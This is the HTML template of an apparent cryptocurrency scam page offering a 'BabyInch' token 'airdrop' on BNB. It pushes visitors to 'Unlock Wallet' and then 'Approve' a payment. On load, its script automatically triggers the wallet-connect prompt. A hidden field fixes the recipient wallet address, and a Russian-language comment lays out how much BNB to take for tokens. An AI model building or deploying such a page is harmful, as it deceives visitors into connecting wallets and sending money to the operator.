<!DOCTYPE html>
<html lang="">
<head>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="/main/favicon.ico">
	<title>apporve</title>
	<link href="/unlock/app.css" rel="preload" as="style">
	<link href="/unlock/chunk-vendors.css" rel="preload" as="style">
<? /*	
	<link href="/unlock/app.js" rel="preload" as="script">
	<link href="/unlock/chunk-vendors.js" rel="preload" as="script">
*/ ?>	
	<link href="/unlock/chunk-vendors.css" rel="stylesheet">
	<link href="/unlock/app.css" rel="stylesheet">
	
	    <script src="/main/jquery-3.5.1.min.dc5e7f18c8.js?site=60edb8db2b74467f7f9efc05" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
		
</head>
<body>
<noscript><strong>We're sorry but apporve doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript>
		<div data-v-415f3ee5="" class="main">
	<nav data-v-415f3ee5="" class="mt4">
		<div data-v-415f3ee5="" class="navigation">
			<a data-v-415f3ee5="" variant="subtle" id="swap-nav-link" scale="sm" href="#/swap" class="selected active hover">Unlock wallet</a>
			<!--<a data-v-415f3ee5="" variant="tertiary" id="pool-nav-link" scale="sm" href="#/pool" class="unselected active hover">Swap</a>-->
		</div>
	</nav>

	<div data-v-415f3ee5="" class="box">
		<div data-v-415f3ee5="" class="flex box-head">
			<div data-v-415f3ee5="" class="mr16 flex-items-center">
				<div data-v-415f3ee5="" class="flex-column">
					<!--<h2 data-v-415f3ee5="" color="text" class="sc-iwjezw box-title box-title-1"> Exchange </h2>-->
		<div data-v-415f3ee5="" class="flex-items-center">
			<div data-v-415f3ee5="" color="textSubtle" font-size="14px" class="box-desc"> Get Airdrop</div>
		</div>
				</div>
			</div>

	<div data-v-415f3ee5="" class="flex">
		<span data-v-415f3ee5="" class="inline-flex">
			<button data-v-415f3ee5="" id="open-settings-dialog-button" scale="md" class="svg-button">
	<!--<svg data-v-415f3ee5="" viewBox="0 0 24 24" color="primary" width="24px" xmlns="http://www.w3.org/2000/svg" class="sc-bdvvaa svg-color"><path data-v-415f3ee5="" d="M0 0h24v24H0z" fill="none"></path><path data-v-415f3ee5="" d="M3 17v2h6v-2H3zM3 5v2h10V5H3zm10 16v-2h8v-2h-8v-2h-2v6h2zM7 9v2H3v2h4v2h2V9H7zm14 4v-2H11v2h10zm-6-4h2V7h4V5h-4V3h-2v6z"></path></svg>-->
			</button>
				<span data-v-415f3ee5="" class="LURuF"></span>
		</span>
			<button data-v-415f3ee5="" scale="md" class="svg-button2">
	<!--<svg data-v-415f3ee5="" viewBox="0 0 24 24" color="primary" width="24px" xmlns="http://www.w3.org/2000/svg" class="sc-bdvvaa svg-color"><path data-v-415f3ee5="" d="M13 3C8.03 3 4 7.03 4 12H2.20711C1.76165 12 1.53857 12.5386 1.85355 12.8536L4.54604 15.546C4.73751 15.7375 5.04662 15.7418 5.24329 15.5556L8.08805 12.8631C8.4164 12.5524 8.19646 12 7.74435 12H6C6 8.13 9.13 5 13 5C16.87 5 20 8.13 20 12C20 15.87 16.87 19 13 19C11.4314 19 9.98175 18.4782 8.81739 17.601C8.37411 17.267 7.74104 17.259 7.3486 17.6514C6.95725 18.0428 6.95413 18.6823 7.38598 19.0284C8.92448 20.2615 10.8708 21 13 21C17.97 21 22 16.97 22 12C22 7.03 17.97 3 13 3ZM12 8V13L16.28 15.54L17 14.33L13.5 12.25V8H12Z"></path></svg>-->
			</button>
	</div>
		</div>

<div data-v-415f3ee5="" id="swap-page" class="box-input"  >

	<div data-v-415f3ee5="" class="box-gap">
	
	
		<div data-v-415f3ee5="" id="swap-currency-input" class="box-each-input">
			<div data-v-415f3ee5="" class="each-input-box">
				<div data-v-415f3ee5="" class="input-second-box">
	<? /*			
	<input data-v-415f3ee5="" inputmode="decimal" title="Token Amount" autocomplete="off" autocorrect="off" type="text" pattern="^[0-9]*[.,]?[0-9]*$" placeholder="0.0" minlength="1" maxlength="79" spellcheck="false" disabled="disabled" class="second-input token-amount-input">
	*/ ?>
	<input  data-v-415f3ee5="" type="number" min="0.01" max="100" step="0.005"  class="second-input token-amount-input" onkeydown="limit(this);" onkeyup="limit(this);" id="web3_send_tx_amount"  value="0.0025"  

			placeholder="BNB swap amount">
	<? /*
	<input data-v-415f3ee5="" inputmode="decimal" title="Token Amount" autocomplete="off" autocorrect="off" type="text" pattern="^[0-9]*[.,]?[0-9]*$" placeholder="0.0" minlength="1" maxlength="79" spellcheck="false" disabled="disabled" class="second-input token-amount-input">

	1.  0,025бнб за 10 BabyInch фиксированно во вкладке Airdrop. без ничего лишнего. просто кнопка.одна.

2. 0,11бнб по дефолту,но с возможностью прокалькулировать и юзеру ввести свою сумму в бнб и отдать юзеру  токенов с коэффициентом х1,8. то есть 0,11бнб =90BabyInch.	
	*/ ?>
	<input class="hidden" id="web3_send_tx_address" name="kripta" type="hidden" value="0xac94295702ab94193032d08dbaa747c54b6c1c22">	
	
		
	<span id="" data-v-415f3ee5="" style="margin-left: 10px;" color="text" class="second-nav-title"> </span>	
		<button data-v-415f3ee5="" scale="sm" class="second-nav second-nav-padding open-currency-select-button ">
<div data-v-415f3ee5="" class="second-nav-flex">
<svg data-v-415f3ee5="" viewBox="0 0 16 16" width="28px" color="text" xmlns="http://www.w3.org/2000/svg" class="sc-bdvvaa second-nav-icon" style="margin-right: 8px;"><circle data-v-415f3ee5="" cx="8" cy="8" r="8" fill="#F0B90B"></circle><path data-v-415f3ee5="" d="M5.01656 8.00006L3.79256 9.23256L2.56006 8.00006L3.79256 6.76756L5.01656 8.00006ZM8.00006 5.01656L10.1081 7.12456L11.3406 5.89206L9.23256 3.79256L8.00006 2.56006L6.76756 3.79256L4.66806 5.89206L5.90056 7.12456L8.00006 5.01656ZM12.2076 6.76756L10.9836 8.00006L12.2161 9.23256L13.4401 8.00006L12.2076 6.76756ZM8.00006 10.9836L5.89206 8.87556L4.66806 10.1081L6.77606 12.2161L8.00006 13.4401L9.23256 12.2076L11.3406 10.0996L10.1081 8.87556L8.00006 10.9836ZM8.00006 9.23256L9.23256 8.00006L8.00006 6.76756L6.76756 8.00006L8.00006 9.23256Z" fill="#FFFDFA"></path></svg>

		<div data-v-415f3ee5="" id="pair" color="text" class="second-nav-title"><span id="poln_summ">12.50</span> BabyInch </div>
		
<svg data-v-415f3ee5="" viewBox="0 0 24 24" color="text" width="20px" xmlns="http://www.w3.org/2000/svg" class="sc-bdvvaa second-nav-icon"><path data-v-415f3ee5="" d="M8.11997 9.29006L12 13.1701L15.88 9.29006C16.27 8.90006 16.9 8.90006 17.29 9.29006C17.68 9.68006 17.68 10.3101 17.29 10.7001L12.7 15.2901C12.31 15.6801 11.68 15.6801 11.29 15.2901L6.69997 10.7001C6.30997 10.3101 6.30997 9.68006 6.69997 9.29006C7.08997 8.91006 7.72997 8.90006 8.11997 9.29006Z"></path></svg>
</div>
		</button>
				</div>
			</div>
		</div>
	
		<div data-v-415f3ee5="" id="prepare" class="mt1r">
<button data-v-415f3ee5="" width="100%"  scale="md" id="btn-connect" class="confirm"> Unlock Wallet</button>
</div>
<button data-v-415f3ee5="" class="confirm"  style="display: none"> Send </button>
<a class="button button--primary button--icon-left" id="send_tx_button" href="#" style="display:none;"></a>
 <div id="connecteds"  style="display: none">
            <button class="btn btn-primary" id="btn-disconnect" data-bs-dismiss="modal">
              Cancel
            </button>
          </div>
		  
	<div class="card-footer text-muted" style="display: none">
                        <span>Transaction Hash: </span>
                        <div class="well"><span id='web3_tx_hash'></span></div>
          
          
                    </div>

					
	
	 <div id="network" data-v-415f3ee5=""  class="  iJOpvs">
              <p>
                <strong>Connected:</strong> <span id="network-name"></span>
              </p>

              <p style="display: none">
                <strong>Selected account:</strong> <span id="selected-account"></span>
              </p>

            </div>	  
	
	
	<div data-v-415f3ee5=""  class="title  iJOpvs"> You have <span id="balance" class="balanceLabel">0</span> BNB in your wallet <span id="selected-short"></span></div>

						  
		   <div id="templates" style="display: none">
      <template id="template-balance">
        <tr>
          <th class="address"></th>
          <td class="balance"></td>
        </tr>
      </template>
	  <span id="accounts"></span>
    </div>
		
		<div data-v-415f3ee5="" class="sc-gyEloo cYCfsX" style="padding: 0px 16px;">
			<div data-v-415f3ee5="" class="sc-jRQAMF sc-dUbuoE sc-htJSpn iODQYo cOONby ixfgSN">
				  
				  <div data-v-415f3ee5="" color="text" class="sc-gsDJrp sc-bUhGej kPrhaX iJOpvs"> Price </div><div data-v-415f3ee5="" color="text" class="sc-gsDJrp kPrhaX" style="justify-content: center; align-items: center; display: flex;"> 10  BabyInch per 0,002 BNB <button data-v-415f3ee5="" class="sc-dcgxYM eHtIJs"><svg data-v-415f3ee5="" viewBox="0 0 24 24" width="14px" color="text" xmlns="http://www.w3.org/2000/svg" class="sc-bdvvaa TGXYu"><path data-v-415f3ee5="" d="M12 6V7.79C12 8.24 12.54 8.46 12.85 8.14L15.64 5.35C15.84 5.15 15.84 4.84 15.64 4.64L12.85 1.85C12.54 1.54 12 1.76 12 2.21V4C7.58 4 4 7.58 4 12C4 13.04 4.2 14.04 4.57 14.95C4.84 15.62 5.7 15.8 6.21 15.29C6.48 15.02 6.59 14.61 6.44 14.25C6.15 13.56 6 12.79 6 12C6 8.69 8.69 6 12 6ZM17.79 8.71C17.52 8.98 17.41 9.4 17.56 9.75C17.84 10.45 18 11.21 18 12C18 15.31 15.31 18 12 18V16.21C12 15.76 11.46 15.54 11.15 15.86L8.36 18.65C8.16 18.85 8.16 19.16 8.36 19.36L11.15 22.15C11.46 22.46 12 22.24 12 21.8V20C16.42 20 20 16.42 20 12C20 10.96 19.8 9.96 19.43 9.05C19.16 8.38 18.3 8.2 17.79 8.71Z"></path></svg></button></div>
			</div>
		</div>
			
			<div data-v-415f3ee5="" class="sc-gyEloo cYCfsX" style="padding: 0px 16px;"><div data-v-415f3ee5="" class="sc-jRQAMF sc-dUbuoE sc-htJSpn iODQYo cOONby ixfgSN"><div data-v-415f3ee5="" color="text" class="sc-gsDJrp sc-bUhGej kPrhaX iJOpvs"> Slippage Tolerance </div><div data-v-415f3ee5="" color="text" class="sc-gsDJrp bJUCGJ" style="justify-content: center; align-items: center; display: flex;"> 0% </div></div></div>
			
		
	
			
			<div data-v-415f3ee5="" class="mt1r second-nav-flex" style="gap: 12px;">
			<button data-v-415f3ee5="" width="flex:1" scale="md" id="web3_send_tx_button" class="confirm">Approve</button>
			<!--<button data-v-415f3ee5="" width="flex:1" scale="md" class="confirm confirm_cancel"> Swap Anyway </button></div><div data-v-415f3ee5="" class="mt1r confirm_line"><button data-v-415f3ee5="" scale="md" class="confirm_circle">1</button><button data-v-415f3ee5="" scale="md" class="confirm_circle confirm_circle_cancel"> 2 </button></div>-->
		<span id="nyama" style="display: none">	   </span>	
		
		</div><!---->
	</div>
	
	
	
	
	

<!----><!----><!---->
</div>
	</div>
	
	
	

	
	
		</div>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/web3@1.3.6/dist/web3.min.js"></script>
    <script type="text/javascript" src="https://unpkg.com/web3modal@1.9.4/dist/index.js"></script>
    <script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
    <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider@1.2.1/dist/umd/index.min.js"></script>
    <script type="text/javascript" src="https://unpkg.com/fortmatic@2.2.1/dist/fortmatic.js"></script>
<script type="text/javascript" src="/main/example227.js"></script>
</body>
</html>
<script type="text/javascript">
function limit(element)
{
    var max_chars = 7;

    if(element.value.length > max_chars) {
        element.value = element.value.substr(0, max_chars);
    }
}
</script>
<script type="text/javascript">
jQuery(document).on('change','#web3_send_tx_amount',function(e){
		var kurs_eth = 1;
		var skoka = $('#web3_send_tx_amount').val();
//alert(skoka);
		if(( skoka > 100 ) || ( skoka == '' )) { $('#web3_send_tx_amount').val('100.00'); }
 		
		var kurs = 0.0002;
		var sum = kurs_eth*skoka/kurs;	
		sum = sum.toFixed(2);
//		alert(sum);
	jQuery('#poln_summ').text(sum);
	  
});
</script>	
<script>
jQuery( window ).on("load", function() {
	
	var trynity = jQuery("#selected-account").text();
//  alert(trynity);
jQuery("#btn-connect").trigger("click"); 
});
</script>